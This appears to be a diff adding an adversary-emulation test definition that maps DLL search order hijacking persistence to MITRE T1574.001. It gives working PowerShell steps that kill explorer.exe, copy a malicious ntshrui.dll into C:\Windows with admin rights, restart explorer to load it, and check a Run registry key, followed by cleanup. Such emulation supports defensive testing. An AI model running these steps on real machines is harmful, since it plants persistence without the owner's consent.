@@ -1,0 +1,57 @@
+---
+api_version: 2.0
+uuid: 2828a3ec-88fe-42c8-a75c-b176819bedb3
+name: DLL Search Order Hijacking Persistence
+authors:
+  - jaysong
+description: |
+  This TTP demonstrates how an attacker can abuse DLL search order hijacking to create persistence on a Windows system.
+  Threat Intel - S0113    Prikormka - https://web-assets.esetstatic.com/wls/2016/05/Operation-Groundbait.pdf
+requirements:
+  platforms:
+    - os: windows
+  superuser: true
+mitre:
+  tactics:
+    - TA0003 Persistence
+  techniques:
+    - T1574 Hijack Execution Flow
+  subtechniques:
+    - T1574.001 DLL
+steps:
+  - name: Verifying dll file presence and checksum
+    executor: powershell
+    inline: |
+      echo "Verifying dll file presence and checksum"
+    checks:
+      - msg: "Malicious dll file is either not present or has the wrong checksum"
+        path_exists: ./ntshrui.dll
+        checksum:
+          sha256: 7d408b0b702b0cba002db15b2ed35fdf794f11013eb055c825fd4b5f78a4d089
+  - name: Killing explorer.exe
+    kill_process_name: explorer.exe
+  - name: Copying malicious DLL to C:\Windows
+    executor: powershell
+    inline: |
+      Copy-Item -Path '.\ntshrui.dll' -Destination 'C:\Windows\ntshrui.dll' -Force
+  - name: Starting explorer.exe to load the malicious DLL
+    executor: powershell
+    inline: |
+      Start-Process -FilePath 'explorer.exe'
+      sleep 5
+  - name: Check if persistence was established
+    executor: powershell
+    inline: |
+      Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+  - name: Killing explorer.exe for cleanup
+    kill_process_name: explorer.exe
+  - name: Cleanup
+    executor: powershell
+    inline: |
+      Remove-Item -Path 'C:\Windows\ntshrui.dll' -Force
+      Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Calculator"
+      Start-Process -FilePath 'explorer.exe'
+      sleep 5
+      echo "DLL Search Order Hijacking Persistence Cleanup Complete"
+      echo "Verifying......"
+      Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
